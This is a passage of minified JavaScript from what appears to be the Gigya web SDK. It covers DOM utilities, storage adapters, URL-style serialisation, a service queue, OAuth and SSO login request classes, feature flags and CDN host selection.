      t.getNextZIndex = u, t.getGigyaScriptElement = function (e) {
        for (var t, i = document.getElementsByTagName("script"), n = /\/\/cdn(s)?\.(ru1\.)?gigya.com/, o = i.length - 1; o >= 0; o--) {
          var r = i[o],
            a = r.src.toLowerCase();
          if ("" !== a) if (n.test(a) || a.indexOf("?apikey=") > -1) if (0 === e.length || e.some(function (e) {
            return a.indexOf(e) > -1;
          })) {
            t = r;
            break;
          }
        }
        return t;
      }, t.dispatch = function (e, t) {
        var i;
        try {
          i = new Event(t);
        } catch (e) {
          (i = document.createEvent("CustomEvent")).initCustomEvent(t, !0, !0, {});
        }
        e.dispatchEvent(i);
      }, t.addButtonSubmitListener = function (e, t, i, n) {
        void 0 === i && (i = "click"), e && (e.setAttribute("role", "button"), "-1" != e.getAttribute("tabindex") && e.setAttribute("tabindex", "0"), c(e, i, function (e) {
          return t(e);
        }), c(e, "keydown", function (e) {
          13 == (e.which || e.keyCode) && (e.preventDefault(), t(e));
        }));
      }, t.addEventListener = c, t.addActivationHandler = function (e, t) {
        e && t && (this.addEventListener(e, "keydown", function (e) {
          "Space" !== e.code && "Enter" !== e.code || t();
        }), this.addEventListener(e, "click", t));
      }, t.removeEventListener = l, t.disableDefaultEventHandling = function (e) {
        e.preventDefault ? e.preventDefault() : window.event && (window.event.returnValue = !1);
      }, t.addDialogBackListener = function (e) {
        g(), s = function (t) {
          t && t.newURL && -1 == t.newURL.indexOf("|gigyaMobileDialog") && (e(t), g());
        }, window.setTimeout(function () {
          -1 == window.location.hash.indexOf("|gigyaMobileDialog") && (window.location.hash = window.location.hash + "|gigyaMobileDialog"), c(window, "hashchange", s);
        }, 50);
      }, t._removeDialogBackListener = g, t.prependToBody = function (e, t) {
        void 0 === t && (t = window.document), t.body && (t.body.insertBefore && t.body.firstChild ? t.body.insertBefore(e, t.body.firstChild) : t.body.appendChild(e));
      }, t.appendToBody = d, t.removeElement = function (e) {
        e && e.parentElement && e.parentElement.removeChild(e);
      }, t.isChildOf = function (e, t) {
        for (var i = e.parentNode; i;) {
          if (t == i) return !0;
          i = i.parentNode;
        }
        return !1;
      }, t.isVisible = function (e) {
        for (; e;) {
          var t = getComputedStyle(e);
          if ("none" === t.display || "hidden" === t.visibility) return !1;
          e = e.parentElement;
        }
        return !0;
      }, t.getCenteredDivID = function (e) {
        return "gig_" + n.localInfo.initTime.getTime().toString() + "_" + e;
      }, t.createElementWithAttributes = function (e, t) {
        var i = document.createElement(e);
        if (t) for (var n in t) i[n] = t[n];
        return i;
      }, t.createTopLevelDiv = function (e) {
        var t = document.createElement("div");
        return null != t.style.zIndex && (t.style.zIndex = "" + u()), t.innerHTML = "", e && (t.id = e), document.body && (document.body.insertBefore && document.body.firstChild ? document.body.insertBefore(t, document.body.firstChild) : document.body.appendChild && document.body.appendChild(t)), t;
      }, t.hideByID = function (e) {
        var t = document.getElementById(e);
        t && (t.style.display = "none");
      }, t.showByID = function (e) {
        var t = document.getElementById(e);
        t && (t.style.display = n.localInfo.isIE6 ? "TD" == t.tagName ? "table-cell" : "TR" == t.tagName || "TABLE" == t.tagName ? "" : "block" : "");
      }, t.clearByID = function (e) {
        try {
          var t = document.getElementById(e);
          null != t && (t.innerHTML = "");
        } catch (e) {}
      }, t.getHTMLSize = function (e, t) {
        var i = document.createElement("div");
        i.style.position = "absolute", i.style.left = "-1000px", i.innerHTML = e, t.appendChild(i);
        var n = i.offsetWidth,
          o = i.offsetHeight;
        return i.parentNode.removeChild(i), {
          w: n,
          h: o
        };
      }, t.getElementsByClass = function (e, t, i) {
        if (!e) return [];
        var n = [];
        i && p(e, t) && n.push(e);
        for (var o = e.getElementsByTagName("*"), r = 0; r < o.length; r++) p(o[r], t) && n.push(o[r]);
        return n || [];
      }, t.getElementsByAttribute = function (e, t, i, n) {
        for (var o = [], r = e.getElementsByTagName(t), a = 0; a < r.length; a++) r[a].getAttribute(i) == n && o.push(r[a]);
        return o;
      }, t.getElementPosition = function (e) {
        if (!e) return {
          left: 0,
          top: 0,
          bottom: 0,
          right: 0
        };
        var t = e.getBoundingClientRect(),
          i = o.getScroll(),
          n = t.left + i.left,
          r = t.top + i.top;
        return {
          left: n,
          top: r,
          right: n + t.width,
          bottom: r + t.height
        };
      }, t.addClassToElement = function (e, t) {
        if (e) {
          var i = e.className ? f(e) : [],
            n = i.length,
            o = t.split(" ");
          for (var r in o) {
            var a = !1;
            if (!o[r]) break;
            for (var s in i) if (i[s] === o[r]) {
              a = !0;
              break;
            }
            a || i.push(o[r]);
          }
          i.length !== n && (e.className = i.join(" "));
        }
      }, t.removeClassFromElement = function (e, t, i) {
        if (void 0 === i && (i = !1), e) {
          for (var n = f(e), o = n.length - 1; o >= 0; o--) (n[o] === t || i && -1 !== n[o].indexOf(t)) && n.splice(o, 1);
          e.className = n.join(" ");
        }
      }, t.getClassNames = f, t.isElementClass = p, t.cancelEvent = function (e) {
        e && ("cancelable" in e ? e.preventDefault() : e.returnValue = !1);
      }, t.createElement = function (e, t) {
        var i = document.createElement("div");
        return t = t || "", i.innerHTML = "<" + e + ' name="' + t + '" id="' + t + '"></' + e + ">", i.firstChild;
      }, t.setSize = function (e, t, i, n) {
        if (null != e && null != e.style) {
          if (t) {
            var r = (t = "" + t).indexOf("%") > 0;
            if (!isNaN(t) || r) {
              var a = "" + (r ? t : t + "px");
              e.style.width != a && (e.style.width = a);
            }
          }
          if (i) {
            var s = (i = "" + i).indexOf("%") > 0;
            if (!isNaN(t) || s) {
              var c = "" + (s ? i : i + "px");
              e.style.height !== c && (e.style.height = c);
            }
          }
          if (n && t && i) {
            (null == e.style.zIndex || n) && (e.style.zIndex = "" + u());
            var l = o.getInnerSize(),
              g = o.getScroll(),
              d = g.top,
              f = g.left;
            e.style.top = Math.max(0, d + Math.floor((l.h - i) / 2)) + "px", e.style.left = Math.max(0, f + Math.floor((l.w - t) / 2)) + "px", e.style.visibility = "";
          }
        }
      }, t.createHiddenIframe = function (e) {
        var t = document.createElement("iframe");
        return t.src = e, t.style.width = "30px", t.style.height = "10px", t.style.position = "absolute", t.style.top = "-1000px", t.style.left = "-1000px", document.body ? d(t) : r.invokeOnPageLoad(function () {
          d(t);
        }), t;
      }, t.attributeEncode = function (e) {
        return e.replace(/</g, "&lt;").replace(/>/g, "&gt;").replace(/\"/g, "&quot;").replace(/\'/g, "&#39;");
      }, t.manipulateAttributes = function (e, t, i, n) {
        void 0 === n && (n = function () {
          return !0;
        }), e.forEach(function (e) {
          e.attributes && Array.prototype.slice.call(e.attributes).forEach(function (e) {
            n(e) && (e.value = e.value.replace(t, i));
          });
        });
      }, t.textNodesUnder = function (e) {
        for (var t, i = [], n = document.createTreeWalker(e, NodeFilter.SHOW_TEXT, null, !1); t = n.nextNode();) i.push(t);
        return i;
      }, t.isHTMLBooleanAttribute = function (e) {
        return ["autocomplete", "autofocus", "checked", "disabled", "hidden", "readonly", "required", "selected"].indexOf(e) > -1;
      }, t.isBelongToGigyaFieldset = function e(t) {
        return !(!t || t instanceof HTMLFormElement) && (!!p(t.parentElement, "gigya-fieldset") || e(t.parentElement));
      }, t.getClosestElement = function (e, t, i) {
        for (void 0 === i && (i = document), Element.prototype.matches || (Element.prototype.matches = Element.prototype.msMatchesSelector || Element.prototype.webkitMatchesSelector); e && e !== i; e = e.parentNode) if (null == e ? void 0 : e.matches(t)) return e;
        return null;
      }, t.createElementFromTemplate = function (e) {
        var t;
        void 0 === e && (e = "");
        var i = document.createElement("div");
        return i.innerHTML = null == e ? void 0 : e.trim(), null !== (t = i.firstChild) && void 0 !== t ? t : i;
      }, t.isParentHasClass = function e(t, i) {
        var n;
        return !!(null === (n = null == t ? void 0 : t.classList) || void 0 === n ? void 0 : n.contains(i)) || !!(null == t ? void 0 : t.parentElement) && e(null == t ? void 0 : t.parentElement, i);
      };
    },
    14: function (e, t, i) {
      Object.defineProperty(t, "__esModule", {
        value: !0
      });
      var n = i(0),
        o = i(5),
        r = i(3),
        a = i(12),
        s = function () {
          function e() {}
          return e.getName = function () {
            return "AbstractAdapter";
          }, e.prototype.setObject = function (e, t) {
            this.setItem(e, o.serialize(t));
          }, e.prototype.getObject = function (e, t) {
            return o.deserialize(this.getItem(e), t);
          }, e.prototype.isPersistent = function () {
            return !0;
          }, e;
        }();
      t.AbstractLocalStorageAdapter = s;
      var u = function (e) {
        function t() {
          var t = e.call(this) || this;
          return t.isLoaded = !1, t;
        }
        return n.__extends(t, e), t.prototype.isReady = function () {
          return this.isLoaded;
        }, t.prototype.waitForService = function (e) {
          var t = this;
          this.isReady() ? e() : setTimeout(function () {
            return t.waitForService(e);
          }, 50);
        }, t;
      }(s);
      t.AbstractAsyncLocalStorageAdapter = u;
      var c = function (e) {
          function t() {
            return null !== e && e.apply(this, arguments) || this;
          }
          return n.__extends(t, e), t.prototype.getItem = function (e) {
            return this.storage[e];
          }, t.prototype.setItem = function (e, t, i) {
            try {
              this.storage[e] = t;
            } catch (e) {}
          }, t.prototype.removeItem = function (e) {
            this.storage.removeItem(e);
          }, t;
        }(s),
        l = function (e) {
          function t() {
            var t = e.call(this) || this;
            return t.storage = window.localStorage, t;
          }
          return n.__extends(t, e), t.getName = function () {
            return "LocalStorageAdapter";
          }, t.isAvailable = function () {
            return r.localInfo.supportsLocalStorage;
          }, t;
        }(c),
        g = function (e) {
          function t() {
            var t = e.call(this) || this;
            return t.storage = window.sessionStorage, t;
          }
          return n.__extends(t, e), t.getName = function () {
            return "SessionStorageAdapter";
          }, t.isAvailable = function () {
            return r.localInfo.supportsSessionStorage;
          }, t;
        }(c),
        d = function (e) {
          function t() {
            return null !== e && e.apply(this, arguments) || this;
          }
          return n.__extends(t, e), t.isAvailable = function () {
            return r.localInfo.isFF && window.globalStorage;
          }, t.getName = function () {
            return "FirefoxStorageAdapter";
          }, t.prototype.getItem = function (e) {
            return window.globalStorage[location.hostname][e];
          }, t.prototype.setItem = function (e, t, i) {
            try {
              window.globalStorage[location.hostname][e] = t;
            } catch (e) {}
          }, t.prototype.removeItem = function (e) {
            delete window.globalStorage[location.hostname][e];
          }, t;
        }(s),
        f = function (e) {
          function t() {
            return null !== e && e.apply(this, arguments) || this;
          }
          return n.__extends(t, e), t.isAvailable = function () {
            return a.default.canSaveCookie();
          }, t.getName = function () {
            return "CookieStorageAdapter";
          }, t.prototype.getItem = function (e) {
            return a.default.get(e);
          }, t.prototype.setItem = function (e, t, i, n, o) {
            void 0 === o && (o = {}), a.default.set(e, t, i, n, o.dontUseRootPath, o.sameSite);
          }, t.prototype.removeItem = function (e) {
            a.default.remove(e);
          }, t;
        }(s);
      t.CookieStorageAdapter = f;
      var p = function (e) {
        function t() {
          var t = e.call(this) || this;
          return t.memory = {}, t;
        }
        return n.__extends(t, e), t.isAvailable = function () {
          return !0;
        }, t.getName = function () {
          return "MemoryStorageAdapter";
        }, t.prototype.getItem = function (e) {
          return this.memory[e];
        }, t.prototype.setItem = function (e, t, i) {
          this.memory[e] = t;
        }, t.prototype.removeItem = function (e) {
          delete this.memory[e];
        }, t.prototype.isPersistent = function () {
          return !1;
        }, t;
      }(s);
      function h(e) {
        var i = e.getName() || e.name;
        return t.instances[i] || (t.instances[i] = new e()), t.instances[i];
      }
      function y(e) {
        for (var i, n = 0, o = t.adapters; n < o.length; n++) {
          var r = o[n];
          if (r.isAvailable()) {
            if (r.prototype instanceof u && !e) continue;
            i = h(r);
            break;
          }
        }
        return i || (i = h(p)), e && (i instanceof u ? i.waitForService(function () {
          e(i);
        }) : e(i)), i;
      }
      t.MemoryStorageAdapter = p, t.adapters = [l, g, d, f, p], t.instances = {}, t.initializeAdapter = h, t.waitForService = y;
      var v = y();
      t.getItem = function (e) {
        return v.getItem(e);
      }, t.setItem = function (e, t, i) {
        return v.setItem(e, t, i);
      }, t.removeItem = function (e) {
        return v.removeItem(e);
      }, t.setObject = function (e, t) {
        return v.setObject(e, t);
      }, t.getObject = function (e, t) {
        return v.getObject(e, t);
      };
    },
    16: function (e, t, i) {
      Object.defineProperty(t, "__esModule", {
        value: !0
      });
      var n = i(10),
        o = i(5),
        r = i(2);
      function a(e) {
        var t = unescape(e),
          i = n.URLDecode(e);
        return 0 !== t.localeCompare(i) && window.gigya.logger.report("urlDecoder and unescaped have different values", {
          unescapedResult: t,
          urlDecodeResult: i
        }), i;
      }
      t.serialize = function (e, t) {
        var i = [];
        for (var r in t || (t = "&"), e) switch (typeof e[r]) {
          case "function":
            break;
          case "object":
            null != e[r] && i.push(r + "=" + n.URLEncode(o.serialize(e[r])));
            break;
          case "undefined":
            break;
          default:
            i.push(r + "=" + n.URLEncode(e[r]));
        }
        return i.join(t);
      }, t.deserialize = function (e, t, i, o) {
        var s = {};
        if (!e) return s;
        t || (t = "&");
        for (var u = e.split(t), c = 0; c < u.length; c++) {
          var l = u[c],
            g = l.indexOf("=");
          if (-1 === g) {
            s[d = i ? l.toLowerCase() : l] = "1";
          } else {
            var d = l.substr(0, g);
            i && (d = d.toLowerCase());
            var f = l.substr(g + 1).replace(/\+/g, " ");
            try {
              s[d] = o ? r.FlagService.useDecodeURIComponent ? a(f) : unescape(f) : n.URLDecode(f);
            } catch (e) {
              s[d] = r.FlagService.useDecodeURIComponent ? n.URLDecode(f) : unescape(f);
            }
          }
        }
        return s;
      };
    },
    17: function (e, t) {
      Object.defineProperty(t, "__esModule", {
        value: !0
      });
      var i = {};
      function n(e) {
        if (!i[e]) return !1;
        for (var t in i[e].ids) return !0;
        return !1;
      }
      function o(e, t, n) {
        i[e] || (i[e] = {
          q: [],
          ids: {}
        }), i[e].q.push({
          func: t,
          args: n
        });
      }
      t._servicesStatus = function () {
        var e = {};
        for (var t in i) {
          var o = n(t);
          e[t] = o ? {
            active: !0,
            waitingFor: i[t].ids,
            queuedCount: i[t].q.length
          } : {
            active: !1
          };
        }
        return e;
      }, t.isActive = n, t.release = function (e, t) {
        if (window.gigya.logger.debug("releasing " + t + " queue by " + e), i[t] && (delete i[t].ids[e], !n(t))) {
          var o = i[t].q;
          for (i[t].q = []; o.length > 0;) {
            var r = o.splice(0, 1)[0];
            try {
              r.func.apply(this, r.args);
            } catch (i) {
              "object" == typeof console && console.log && console.log("Gigya: Exception while invoking queued method (" + t + ": " + e + ")");
            }
            if (n(t)) {
              i[t].q = o;
              break;
            }
          }
        }
      }, t.hold = function (e, t) {
        window.gigya.logger.debug("locking queue " + t + " by " + e), i[t] || (i[t] = {
          q: [],
          ids: {}
        }), i[t].ids[e] = !0;
      }, t.waitFor = o, t.queueForExecution = function (e, t, i) {
        i = i || [], n(e) ? o(e, t, i) : t.apply(this, i);
      };
    },
    172: function (e, t, i) {
      Object.defineProperty(t, "__esModule", {
        value: !0
      });
      var n = i(0),
        o = function (e) {
          function t(t, i, n, o) {
            void 0 === o && (o = {});
            var r = e.call(this, window.gigya.defaultApiDomain, t, i, o) || this;
            return r.methodName = t, r.params = i, r.callback = n, r.settings = o, r;
          }
          return n.__extends(t, e), t.prototype.sendAction = function (e) {
            window.gigya.utils.object.add(this.params, this.getAuthParams()), window.gigya._.apiAdapters.web.apiService.sendRequest(this.json()).then(this.callback).catch(function (e) {
              return console.error(e);
            });
          }, t.prototype.json = function () {
            return {
              methodName: this.methodName,
              params: this.params,
              settings: this.settings,
              headers: this.getHeaders()
            };
          }, t;
        }(i(129).BaseRequest);
      t.ApiRequest = o;
    },
    173: function (e, t, i) {
      (function (e) {
        Object.defineProperty(t, "__esModule", {
          value: !0
        });
        var n = i(0),
          o = i(129),
          r = i(94),
          a = i(2),
          s = ["twitter"],
          u = function (t) {
            function i(e, i, n, o, r, a) {
              void 0 === a && (a = {});
              var s = t.call(this, i, n, o, a) || this;
              return s.id = e, s.baseUrl = i, s.methodName = n, s.params = o, s.callback = r, s.settings = a, s.windowName = s.methodName.replace(/\./g, "_").replace(/\//g, "") + "_" + new Date().getTime(), s.requestID = s.windowName + new Date().getTime(), s;
            }
            return n.__extends(i, t), i.prototype.beforeRequest = function () {}, i.prototype.afterResponse = function (e) {
              e.dontClose && "false" !== e.dontClose || window.gigya.utils.win.close(this.windowName), this.callback(e);
            }, i.prototype.getAuthFlow = function () {
              return window.gigya.localInfo.isWindowsPhone || window.gigya.localInfo.isFacebookBrowser || this.enforceRedirectForSocial ? "redirect" : this.params.authFlow ? this.params.authFlow : "popup";
            }, i.prototype.getServerParamsString = function (e) {
              return n.__awaiter(this, void 0, void 0, function () {
                var t, i;
                return n.__generator(this, function (n) {
                  switch (n.label) {
                    case 0:
                      return (t = this.getServerParams()).state = this.getState(this.requestID, this.methodName, this.getAuthFlow()), this.settings.oauthMode === r.OAuthMode.Sso && (delete t.context, "redirect" != this.getAuthFlow() && t.redirectURL && window.gigya.logger.warn('redirectURL is valid only for "Redirect" auth flow')), window.gigya.utils.object.add(t, this.getAuthParams()), [4, window.gigya._.apiAdapter.getGmidTicket()];
                    case 1:
                      return (i = n.sent()) && (t.gmidTicket = i), this.sentLoginToken = t.login_token, "device_sso" === window.gigya.utils.URL.getParamsFromURL(window.location.href).scope && "line" === (null == e ? void 0 : e.name) && (t.x_forceAuthentication = !0), [2, window.gigya.utils.keyValue.serialize(t)];
                  }
                });
              });
            }, i.prototype.sendAction = function () {
              return n.__awaiter(this, void 0, void 0, function () {
                var e,
                  t,
                  i,
                  o,
                  r,
                  a,
                  s = this;
                return n.__generator(this, function (n) {
                  switch (n.label) {
                    case 0:
                      return this.beforeRequest(), this.params.provider && (e = window.gigya.socialize._getProviderByName(this.params.provider)), [4, this.getServerParamsString(e)];
                    case 1:
                      return t = n.sent(), i = {
                        menubar: 0,
                        resizable: 1,
                        scrollbars: 1,
                        width: e ? e.width : void 0,
                        height: e ? e.height : void 0
                      }, this.params.enablePopupLocation ? (i.location = 1, i.toolbar = 1) : i.toolbar = 0, o = this.methodName.split("."), r = this.params.originalMethodName || o[o.length - 1], window.gigya.legacyReports.report(r, this.params.APIKey, this.params.cid, this.params.source, this.params.sourceData, {
                        sn: e ? e.toString() : null
                      }), a = this.getUrl() + "?" + t, "redirect" === this.getAuthFlow() ? window.top.document.location.href = a : (window.gigya.utils.xd.addMessageListener(this.requestID, this.params, !0, function (e) {
                        s.afterResponse(e);
                      }), window.gigya.utils.win.open(a, this.windowName, i)), [2];
                  }
                });
              });
            }, Object.defineProperty(i.prototype, "domain", {
              get: function () {
                return document.location.href.split("?")[0].split("#")[0];
              },
              enumerable: !0,
              configurable: !0
            }), i.prototype.getServerParams = function () {
              var e;
              switch (null === (e = this.settings) || void 0 === e ? void 0 : e.oauthMode) {
                case r.OAuthMode.Sso:
                  return this._normalizeParamsForSSO();
                case r.OAuthMode.Social:
                default:
                  return this._normalizeParamsForSocial();
              }
            }, i.prototype.getState = function (e, t, i) {
              var n;
              switch (null === (n = this.settings) || void 0 === n ? void 0 : n.oauthMode) {
                case r.OAuthMode.Sso:
                  return this._createSSOStateParam(e, t, i);
                case r.OAuthMode.Social:
                default:
                  return this._createSocialStateParam(e, t, i);
              }
            }, i.prototype._normalizeParamsForSSO = function () {
              return e({
                APIKey: window.gigya.apiKey,
                redirectURL: window.top.document.location.href
              }, this.params);
            }, i.prototype._normalizeParamsForSocial = function () {
              var e = {};
              for (var t in this.params) 0 !== t.indexOf("x_") && null != this.params[t] && (e["x_" + t] = this.params[t], delete e[t]);
              e.x_APIKey && (e.client_id = e.x_APIKey, delete e.x_APIKey), e.x_oauth_token && (e.oauth_token = e.x_oauth_token, delete e.x_oauth_token), e.redirect_uri = "/GS/AfterLogin.aspx", e.response_type = this.params.authCodeOnly ? "code" : "server_token", e.x_sdk = "js_" + window.gigya.build.version, a.FlagService.enforceAuthFlowRedirectForSocial && (e.x_authFlow = this.getAuthFlow());
              var i = window.gigya.utils.cookie.get("_gigRefUid_" + this.params.APIKey);
              return i && (e.x_refUID = i), delete e.redirectURL, e;
            }, i.prototype._createSSOStateParam = function (e, t, i) {
              var n = this._state;
              return n.id = e, n.context = this.params.context || {}, n.gig_actions = "sso.login", n.authFlow = i || "redirect", decodeURIComponent(JSON.stringify(n));
            }, i.prototype._createSocialStateParam = function (e, t, i) {
              var n = this._state;
              return n.id = e, "redirect" === i && (n.sourceURL = window.top.document.location.href, this.params.redirectURL ? (n.redirectURL = window.gigya.utils.URL.addParamsToURL(this.params.redirectURL, {
                gig_events: window.gigya.events.global.getEventsForOperation(t)
              }), this.params.redirectMethod && (n.redirectMethod = this.params.redirectMethod), n.addUserInfo = !0) : n.sourceURL = window.gigya.utils.URL.addParamsToURL(n.sourceURL, {
                gig_events: window.gigya.events.global.getEventsForOperation(t)
              })), this.params.provider && "facebook" == this.params.provider.toLowerCase() && (n.invite = this.params.invite), window.gigya.utils.keyValue.serialize(n);
            }, Object.defineProperty(i.prototype, "_messagingMethod", {
              get: function () {
                return window.gigya.localInfo.isIE11 && window.indexedDB || window.gigya.localInfo.isAndroid && this.params.provider && "line" == this.params.provider.toLowerCase() ? window.gigya._.MessagingMethod.LocalStorageListener : window.gigya.localInfo.messagingMethod;
              },
              enumerable: !0,
              configurable: !0
            }), Object.defineProperty(i.prototype, "_lid", {
              get: function () {
                return window.gigya.thisScript.globalConf.legacyCrossSiteMethod && "localstorage" !== window.gigya.thisScript.globalConf.legacyCrossSiteMethod.toLowerCase() || window.gigya.localInfo.isIE && window.navigator.msDoNotTrack ? window.gigya.thisScript.globalConf.legacyCrossSiteMethod + ":" + window.gigya.utils.xd._flashListenerID : window.gigya.utils.xd._flashListenerID;
              },
              enumerable: !0,
              configurable: !0
            }), Object.defineProperty(i.prototype, "_state", {
              get: function () {
                return {
                  domain: this._domain,
                  lid: this._lid,
                  messaging: this._messagingMethod
                };
              },
              enumerable: !0,
              configurable: !0
            }), Object.defineProperty(i.prototype, "_domain", {
              get: function () {
                return document.location.href.split("?")[0].split("#")[0];
              },
              enumerable: !0,
              configurable: !0
            }), Object.defineProperty(i.prototype, "enforceRedirectForSocial", {
              get: function () {
                return a.FlagService.enforceAuthFlowRedirectForSocial && window.gigya.utils.array.includes(s, this.params.provider);
              },
              enumerable: !0,
              configurable: !0
            }), i;
          }(o.BaseRequest);
        t.OauthRequest = u;
      }).call(this, i(0).__assign);
    },
    19: function (e, t) {
      function i(e) {
        return e.replace(/([.*+?^=!:${}()|\[\]\/\\])/g, "\\$1");
      }
      Object.defineProperty(t, "__esModule", {
        value: !0
      }), t.trim = function (e) {
        return e.replace(/^\s*(\S*(.*\S)?)\s*$/, "$1");
      }, t.format = function (e) {
        for (var t = [], i = 1; i < arguments.length; i++) t[i - 1] = arguments[i];
        for (var n = 0; n < arguments.length - 1; n++) null != arguments[n + 1] && (e = e.split("{" + n + "}").join(arguments[n + 1]));
        return e;
      }, t.capitalize = function (e) {
        return e.substring(0, 1).toUpperCase() + e.substring(1);
      }, t.endsWith = function (e, t) {
        return -1 !== e.indexOf(t, e.length - t.length);
      }, t.escapeRegExp = i, t.replaceAll = function (e, t, n) {
        return t ? e.replace(new RegExp(i(t), "g"), n) : e;
      }, t.mergeCommaSeparatedValues = function (e, t) {
        void 0 === e && (e = ""), void 0 === t && (t = "");
        var i = e.concat(",", t).split(",");
        return window.gigya.utils.array.getUniqueValues(i).filter(function (e) {
          return e;
        }).join(",");
      };
    },
    2: function (e, t) {
      Object.defineProperty(t, "__esModule", {
        value: !0
      });
      var i = function () {
        function e() {}
        return Object.defineProperty(e, "forceWebSdkBootstrap", {
          get: function () {
            return this.get("forceWebSdkBootstrap");
          },
          enumerable: !0,
          configurable: !0
        }), Object.defineProperty(e, "useGigyaJsBaseDomain", {
          get: function () {
            return this.get("useGigyaJsBaseDomain");
          },
          enumerable: !0,
          configurable: !0
        }), Object.defineProperty(e, "hideSSOFrame", {
          get: function () {
            return this.get("hideSSOFrame");
          },
          enumerable: !0,
          configurable: !0
        }), Object.defineProperty(e, "wcagContrastFix", {
          get: function () {
            return this.get("wcagContrastFix");
          },
          enumerable: !0,
          configurable: !0
        }), Object.defineProperty(e, "newFormLinkInstanceElement", {
          get: function () {
            return this.get("newFormLinkInstanceElement");
          },
          enumerable: !0,
          configurable: !0
        }), Object.defineProperty(e, "stopSendingReports", {
          get: function () {
            return this.get("stopSendingReports");
          },
          enumerable: !0,
          configurable: !0
        }), Object.defineProperty(e, "setGroupApiDomainAfterLogin", {
          get: function () {
            return this.get("setGroupApiDomainAfterLogin");
          },
          enumerable: !0,
          configurable: !0
        }), Object.defineProperty(e, "useHttpStatusCode", {
          get: function () {
            return this.get("useHttpStatusCode");
          },
          enumerable: !0,
          configurable: !0
        }), Object.defineProperty(e, "alwaysCheckCookieSave", {
          get: function () {
            return this.get("alwaysCheckCookieSave");
          },
          enumerable: !0,
          configurable: !0
        }), Object.defineProperty(e, "fixPhoneTFATranslations", {
          get: function () {
            return this.get("fixPhoneTFATranslations");
          },
          enumerable: !0,
          configurable: !0
        }), Object.defineProperty(e, "loadSsoFrameOnlyOnce", {
          get: function () {
            return this.get("loadSsoFrameOnlyOnce");
          },
          enumerable: !0,
          configurable: !0
        }), Object.defineProperty(e, "verifyLoginOnlyOnce", {
          get: function () {
            return this.get("verifyLoginOnlyOnce");
          },
          enumerable: !0,
          configurable: !0
        }), Object.defineProperty(e, "sendLangForEmailOTP", {
          get: function () {
            return this.get("sendLangForEmailOTP");
          },
          enumerable: !0,
          configurable: !0
        }), Object.defineProperty(e, "setProviderFromResponse", {
          get: function () {
            return this.get("setProviderFromResponse");
          },
          enumerable: !0,
          configurable: !0
        }), Object.defineProperty(e, "setCookieSameSiteLaxSession", {
          get: function () {
            return this.get("setCookieSameSiteLaxSession");
          },
          enumerable: !0,
          configurable: !0
        }), Object.defineProperty(e, "setCookieSameSiteLaxSocial", {
          get: function () {
            return this.get("setCookieSameSiteLaxSocial");
          },
          enumerable: !0,
          configurable: !0
        }), Object.defineProperty(e, "setCookieSameSiteLaxLowPriority", {
          get: function () {
            return this.get("setCookieSameSiteLaxLowPriority");
          },
          enumerable: !0,
          configurable: !0
        }), Object.defineProperty(e, "forceErrorReport", {
          get: function () {
            return this.get("forceErrorReport");
          },
          enumerable: !0,
          configurable: !0
        }), Object.defineProperty(e, "skipSameScreenCheckOnSwitch", {
          get: function () {
            return this.get("skipSameScreenCheckOnSwitch");
          },
          enumerable: !0,
          configurable: !0
        }), Object.defineProperty(e, "getOnlyVisibleField", {
          get: function () {
            return this.get("getOnlyVisibleField");
          },
          enumerable: !0,
          configurable: !0
        }), Object.defineProperty(e, "updateAccountInfoAsync", {
          get: function () {
            return this.get("updateAccountInfoAsync");
          },
          enumerable: !0,
          configurable: !0
        }), Object.defineProperty(e, "magicLinkDispatchLoginWhenAdded", {
          get: function () {
            return this.get("magicLinkDispatchLoginWhenAdded");
          },
          enumerable: !0,
          configurable: !0
        }), Object.defineProperty(e, "sanitizeEvaluatedValue", {
          get: function () {
            return this.get("sanitizeEvaluatedValue");
          },
          enumerable: !0,
          configurable: !0
        }), Object.defineProperty(e, "useSessionVerify", {
          get: function () {
            return this.get("useSessionVerify");
          },
          enumerable: !0,
          configurable: !0
        }), Object.defineProperty(e, "useExtendedPhoneNumberRegex", {
          get: function () {
            return this.get("useExtendedPhoneNumberRegex");
          },
          enumerable: !0,
          configurable: !0
        }), Object.defineProperty(e, "generateNewCodeWcagCompliance", {
          get: function () {
            return this.get("generateNewCodeWcagCompliance");
          },
          enumerable: !0,
          configurable: !0
        }), Object.defineProperty(e, "enforceAuthFlowRedirectForSocial", {
          get: function () {
            return this.get("enforceAuthFlowRedirectForSocial");
          },
          enumerable: !0,
          configurable: !0
        }), Object.defineProperty(e, "useDecodeURIComponent", {
          get: function () {
            return this.get("useDecodeURIComponent");
          },
          enumerable: !0,
          configurable: !0
        }), Object.defineProperty(e, "useOidcGetParamHashOldStyle", {
          get: function () {
            return this.get("useOidcGetParamHashOldStyle");
          },
          enumerable: !0,
          configurable: !0
        }), Object.defineProperty(e, "useViewportPollerAction", {
          get: function () {
            return this.get("useViewportPollerAction");
          },
          enumerable: !0,
          configurable: !0
        }), Object.defineProperty(e, "ignoreInterruptionsInOidcPassiveLogin", {
          get: function () {
            return this.get("ignoreInterruptionsInOidcPassiveLogin");
          },
          enumerable: !0,
          configurable: !0
        }), Object.defineProperty(e, "overrideAllChildContext", {
          get: function () {
            return this.get("overrideAllChildContext");
          },
          enumerable: !0,
          configurable: !0
        }), e.get = function (e) {
          var t, i;
          return (null === (t = window.gigya._.config) || void 0 === t ? void 0 : t.flags) && (null === (i = window.gigya._.config) || void 0 === i ? void 0 : i.flags[e]) || !1;
        }, Object.defineProperty(e, "apiFlags", {
          get: function () {
            return [];
          },
          enumerable: !0,
          configurable: !0
        }), e;
      }();
      t.FlagService = i;
    },
    21: function (e, t) {
      Object.defineProperty(t, "__esModule", {
        value: !0
      });
      var i = 0;
      function n(e) {
        var n,
          o,
          r,
          a,
          s = null !== (o = null === (n = window.gigya.thisScript) || void 0 === n ? void 0 : n.baseDomain) && void 0 !== o ? o : "",
          u = null !== (a = null === (r = window.gigya.thisScript) || void 0 === r ? void 0 : r.protocol) && void 0 !== a ? a : "https";
        if (!s || /cdns?\.gigya\.com$/.test(s)) {
          var c = t.CDN_HOSTS[u];
          c.length <= i && (i = 0), s = c[i++];
        }
        return e && 0 !== e.indexOf("/") && (e = "/" + e), u + "://" + s + (e || "");
      }
      t.CDN_HOSTS = {
        http: ["cdn.gigya.com", "cdn1.gigya.com", "cdn2.gigya.com", "cdn3.gigya.com"],
        https: ["cdns.gigya.com", "cdns1.gigya.com", "cdns2.gigya.com", "cdns3.gigya.com"]
      }, t.getCdnResource = n, t.getImgCdnResource = function () {
        return n("/gs/i/");
      };
    },
    22: function (e, t, i) {
      var n, o;
      Object.defineProperty(t, "__esModule", {
        value: !0
      });
      var r,
        a = i(6),
        s = i(19),
